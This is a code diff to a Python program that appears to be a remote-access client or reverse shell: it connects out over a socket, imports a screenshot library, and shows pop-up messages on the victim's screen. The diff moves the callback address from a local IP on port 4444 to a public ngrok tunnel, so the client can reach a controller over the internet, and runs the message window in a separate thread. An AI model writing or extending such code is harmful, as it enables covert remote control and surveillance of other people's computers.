@@ -1,9 +1,10 @@
 import socket, os, sys, platform, time
 import pyscreeze
 from tkinter import *
+import threading
 
-host = "192.168.0.13"
-port = 4444
+host = "0.tcp.ngrok.io"
+port = 18488
 buffer_size = 1024
 
 s = socket.socket()
@@ -83,13 +84,17 @@ def receive_message():
             except:
                 pass
     if message != '':
-        screen = Tk()
-        screen.title('Letter for you!')
-        screen.geometry('300x300')
-        screen.configure(background='#8B0000')
-        label = Label(screen, text=message, background='#8B0000', foreground='#fff')
-        label.place(x=0, y=110, width=300, height=40)
-        screen.mainloop()
+        def messageBox():
+            screen = Tk()
+            screen.title('Letter for you!')
+            screen.geometry('300x300')
+            screen.configure(background='#8B0000')
+            label = Label(screen, text=message, background='#8B0000', foreground='#fff')
+            label.place(x=0, y=110, width=300, height=40)
+            screen.mainloop()
+
+        threading.Thread(target=messageBox).start()
+        
 
 server_connect()
 
